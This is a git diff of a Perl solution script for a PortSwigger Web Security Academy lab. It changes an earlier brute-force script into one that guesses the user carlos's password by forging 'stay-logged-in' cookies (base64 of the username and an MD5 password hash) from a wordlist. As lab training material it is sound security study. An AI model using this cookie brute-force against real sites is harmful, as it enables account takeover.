@@ -12,10 +12,12 @@ use Getopt::Long;
 use Pod::Usage;
 use feature 'say';
 use Term::ANSIColor;
+use Digest::MD5 qw(md5_hex);
+use MIME::Base64 qw(encode_base64);
 
 BEGIN {
     say colored("PortSwigger Web Security Academy", "bold yellow");
-    say colored("Lab: Broken brute-force protection, IP block", "bold yellow");
+    say colored("Lab: Brute-forcing a stay-logged-in cookie", "bold yellow");
     say colored("Solution by weXe1", "bold blue");
     print "\n";
 }
@@ -26,16 +28,9 @@ our(
     $url,
     $proxy,
     $wordlist,
+    $username,
     $help,
 );
-
-our $goodCredentials = {
-    username => 'wiener',
-    password => 'peter'
-};
-
-# target user's name
-our $targetUsername = 'carlos';
 
 GetOptions(
     'u|url=s'           => \$url,
@@ -43,6 +38,8 @@ GetOptions(
     'w|wordlist=s'      => \$wordlist,
     'h|help'            => \$help
 );
+
+$username = 'carlos';
 
 pod2usage(1) if $help;
 pod2usage(1) unless $url;
@@ -58,35 +55,34 @@ if ($proxy) {
     $ua->proxy('http' => $proxy);
 }
 
+$url =~ s/\/$//;
+$url .= "/my-account?id=$username";
+
 open(my $fh, $wordlist) or die colored("[!!] Cannot open file '$wordlist': $!\n");
 
-say colored("[*] Obtaining password for user '$targetUsername'", "cyan");
+say colored("[*] Obtaining password for user '$username', this may take a while...", "cyan");
 
-my $count = 1;
 while (my $pass = <$fh>) {
     chomp($pass);
-    $count++;
-    if ($count == 3) {
-        &makeRequest($goodCredentials->{username}, $goodCredentials->{password});
-        $count = 1;
-    }
 
-    if (&makeRequest($targetUsername, $pass)) {
+    my $encoded = encode_base64("$username:" . md5_hex($pass));
+
+    if (&makeRequest($encoded)) {
         say colored("[+] Found: $pass" , "green");
-        close $fh;
         exit;
     }
 }
 
-say colored("[-] Cannot obtain password with provided wordlist", "red");
-close $fh;
+say colored("[-] Cannot obtain password with provided username and wordlist", "red");
 
 sub makeRequest {
-    my ($username, $password) = @_;
-    my $response = $ua->post($url, {username => $username, password => $password});
+    my $cookie = shift;
+    my $response = $ua->post($url, Cookie => "stay-logged-in=$cookie");
 
-    if ($response->is_success || $response->status_line =~ /302 found/i) {
-        return ($response->decoded_content =~ /incorrect password/ig) ? 0 : 1;
+    if ($response->is_success) {
+        return 1;
+    } elsif ($response->status_line =~ /302 found/i) {
+        return 0;
     } else {
         say STDERR colored($response->status_line, "on_red");
         return 0;
